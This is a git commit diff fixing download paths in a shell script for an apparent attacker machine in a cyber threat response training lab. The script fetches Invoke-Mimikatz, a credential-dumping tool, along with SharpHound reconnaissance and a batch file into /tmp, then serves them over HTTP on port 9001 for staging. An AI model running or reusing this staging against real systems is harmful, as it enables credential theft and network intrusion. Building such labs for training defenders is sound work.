baaad8f3a6d3c61a8bb49017d755c1f1443b3444
Moses Frost <moses@moses.io>
2018-12-01 17:09:49 -0500

    Changes of the script, paths where wrong

--- servers/attacker-desktop/live.sh
+++ servers/attacker-desktop/live.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
-wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/LIVE/attacker-desktop/Invoke-Mimikatz.ps1 -O /tmp/Invoke-Mimikatz.ps1
-wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/LIVE/attacker-desktop/safe.bat -O /tmp/safe.bat
-wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/LIVE/attacker-desktop/sharphound.ps1
+wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/servers/attacker-desktop/Invoke-Mimikatz.ps1 -O /tmp/Invoke-Mimikatz.ps1
+wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/servers/attacker-desktop/safe.bat -O /tmp/safe.bat
+wget https://raw.githubusercontent.com/mosesrenegade/cyber-threat-response-clinic/master/servers/attacker-desktop/sharphound.ps1 -O /tmp/sharphound.ps1
 
 cd /tmp
 python -m 'SimpleHTTPServer' 9001
